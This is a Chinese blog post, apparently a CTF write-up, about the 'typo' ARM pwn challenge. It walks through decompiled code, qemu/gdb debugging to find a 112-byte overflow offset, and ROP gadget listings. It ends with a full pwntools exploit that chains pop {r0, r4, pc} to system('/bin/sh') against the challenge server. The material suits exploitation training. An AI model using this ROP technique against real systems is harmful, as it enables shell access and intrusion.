@@ -1,0 +1,211 @@
+---
+layout: post
+title:  typo
+date:   2022-10-02 00:08:01 +0300
+image:  2022-10-02-spider.jpg
+tags:   [ctf,pwn,arm,ROP,jarvisoj]
+---
+
+arm 下的函数调用约定，函数的第 1 ～ 4 个参数分别保存在 **r0 ～ r3** 寄存器中， 剩下的参数从右向左依次入栈， 被调用者实现栈平衡，函数的返回值保存在 **r0** 中
+
+arm 的 **b/bl** 等指令实现跳转; **pc** 寄存器相当于 x86 的 eip，保存下一条指令的地址，也是我们要控制的目标
+
+main
+
+```assembly
+int __fastcall sub_8F00(int a1, int a2)
+{
+  void *v2; // r3
+  int v3; // r0
+  int v4; // r1
+  int v5; // r2
+  int v6; // r3
+  int v7; // r0
+  int v8; // r0
+  int v9; // r0
+  int v10; // r1
+  __int64 v11; // r0
+  int v12; // r3
+  __int64 v14; // [sp+8h] [bp-2Ch]
+  int v15; // [sp+10h] [bp-24h]
+  int v16; // [sp+14h] [bp-20h]
+  int v17; // [sp+18h] [bp-1Ch]
+  int v18; // [sp+1Ch] [bp-18h]
+  int v19; // [sp+20h] [bp-14h]
+  int v20; // [sp+24h] [bp-10h]
+
+  v20 = 0;
+  v19 = 0;
+  sub_11D04((unsigned int *)off_A1538, 0, 2, 0);
+  sub_11D04((unsigned int *)off_A1534[0], 0, 2, 0);
+  sub_22240(
+    (void *)1,
+    "Let's Do Some Typing Exercise~\nPress Enter to get start;\nInput ~ if you want to quit\n",
+    (void *)0x56,
+    v2);
+  if ( sub_12170(v3, v4, v5, v6) != 0xA )
+    sub_FBD4(0xFFFFFFFF);
+  sub_22240((void *)1, "------Begin------", (void *)0x11, (void *)0xA);
+  v7 = sub_214CC(0);
+  v8 = sub_FE28(v7);
+  v9 = sub_21474(v8);
+  v18 = v9;
+  do
+  {
+    ++v20;
+    v17 = sub_10568(v9, v10) % 0x1198;
+    sub_11338("\n%s\n", &aAbandon[0x14 * v17]);
+    v9 = sub_8D24(&aAbandon[0x14 * v17]);
+    v16 = v9;
+    if ( !v9 )
+    {
+      v9 = sub_11AC0("E.r.r.o.r.");
+      ++v19;
+    }
+  }
+  while ( v16 != 2 );
+  v15 = sub_21474(v9);
+  v11 = sub_9428(v15 - v18);
+  v14 = sub_9770(v11, HIDWORD(v11), 0, 0x412E8480);
+  sub_22240((void *)1, "------END------", (void *)0xF, (void *)v14);
+  sub_11F80(0xA);
+  sub_8DF0(v20 - 1, v19, v14, HIDWORD(v14));
+  sub_11AC0("Bye");
+  return v12;
+}
+```
+
+这里不知道栈溢出的长度，所以需要调试
+
+```assembly
+qemu-arm -g 1212 typo
+# -g参数指定gdb链接端口，因为是静态链接，所以不需要-L参数指定动态链接库
+```
+
+```assembly
+gdb-multiarch # 启动gdb-multiarch
+pwndbg> set arch arm # 设置程序架构为arm架构
+pwndbg> target remote 127.0.0.1:1212 # 链接本地qemu的调试端口
+```
+
+使用cyclic计算缓冲区大小
+
+```assembly
+pwndbg> c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x62616164 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────[ REGISTERS ]──────────────────────────────────
+ R0   0x0
+*R1   0xf6ffef94 ◂— 0x61616161 ('aaaa')
+*R2   0x7e
+ R3   0x0
+*R4   0x62616162 ('baab')
+ R5   0x0
+ R6   0x0
+ R7   0x0
+ R8   0x0
+*R9   0xa5ec ◂— push   {r3, r4, r5, r6, r7, r8, sb, lr}
+*R10  0xa68c ◂— push   {r3, r4, r5, lr}
+*R11  0x62616163 ('caab')
+ R12  0x0
+*SP   0xf6fff008 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+*PC   0x62616164 ('daab')
+───────────────────────────────────[ DISASM ]───────────────────────────────────
+Invalid address 0x62616164
+
+
+
+
+
+
+
+
+
+
+───────────────────────────────────[ STACK ]────────────────────────────────────
+00:0000│ sp 0xf6fff008 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+01:0004│    0xf6fff00c ◂— 'faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+02:0008│    0xf6fff010 ◂— 'gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+03:000c│    0xf6fff014 ◂— 'haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+04:0010│    0xf6fff018 ◂— 'iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+05:0014│    0xf6fff01c ◂— 'jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+06:0018│    0xf6fff020 ◂— 'kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+07:001c│    0xf6fff024 ◂— 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
+ ► f 0 0x62616164
+────────────────────────────────────────────────────────────────────────────────
+pwndbg> cyclic -l 0x62616164
+112
+```
+
+然后需要找到system函数
+
+在字符串中可以发现`/bin/sh`，查看交叉引用定位到sub_10BA8函数，后来知道这个是do_system()函数，再次查看交叉引用定位到sub_110B4函数，这个函数就是system函数
+
+接下来寻找gadget
+
+```assembly
+ROPgadget --binary ./typo --only "pop|r0"
+Gadgets information
+============================================================
+0x00008d1c : pop {fp, pc}
+0x00020904 : pop {r0, r4, pc}
+0x00068bec : pop {r1, pc}
+0x00008160 : pop {r3, pc}
+0x0000ab0c : pop {r3, r4, r5, pc}
+0x0000a958 : pop {r3, r4, r5, r6, r7, pc}
+0x00008a3c : pop {r3, r4, r5, r6, r7, r8, fp, pc}
+0x0000a678 : pop {r3, r4, r5, r6, r7, r8, sb, pc}
+0x00008520 : pop {r3, r4, r5, r6, r7, r8, sb, sl, fp, pc}
+0x00068c68 : pop {r3, r4, r5, r6, r7, r8, sl, pc}
+0x00014a70 : pop {r3, r4, r7, pc}
+0x00008de8 : pop {r4, fp, pc}
+0x000083b0 : pop {r4, pc}
+0x00008eec : pop {r4, r5, fp, pc}
+0x00009284 : pop {r4, r5, pc}
+0x000242e0 : pop {r4, r5, r6, fp, pc}
+0x000095b8 : pop {r4, r5, r6, pc}
+0x000212ec : pop {r4, r5, r6, r7, fp, pc}
+0x000082e8 : pop {r4, r5, r6, r7, pc}
+0x00043110 : pop {r4, r5, r6, r7, r8, fp, pc}
+0x00011648 : pop {r4, r5, r6, r7, r8, pc}
+0x00048e9c : pop {r4, r5, r6, r7, r8, sb, fp, pc}
+0x0000a5a0 : pop {r4, r5, r6, r7, r8, sb, pc}
+0x0000870c : pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}
+0x00011c24 : pop {r4, r5, r6, r7, r8, sb, sl, pc}
+0x000553cc : pop {r4, r5, r6, r7, r8, sl, pc}
+0x00023ed4 : pop {r4, r5, r7, pc}
+0x00023dbc : pop {r4, r7, pc}
+0x00014068 : pop {r7, pc}
+
+Unique gadgets found: 29
+```
+
+使用`0x00020904 : pop {r0, r4, pc}`这条语句，其中还向r4寄存器pop数据，所以在构造payload的时候需要有一个四字节的内容供r4使用
+
+exp
+
+```assembly
+from pwn import *
+
+io = remote("node4.buuoj.cn", 27106)
+
+binsh = 0x0006c384
+pop_r0_r4_pc = 0x00020904
+system = 0x000110B4
+# main = 0x8F00
+payload = "a"*112 + p32(pop_r0_r4_pc) + p32(binsh)*2 + p32(system)
+
+io.recvuntil("quit\n")
+io.send("\n")
+
+io.recvuntil("\n")
+io.sendline(payload)
+
+
+io.interactive()
+```
+
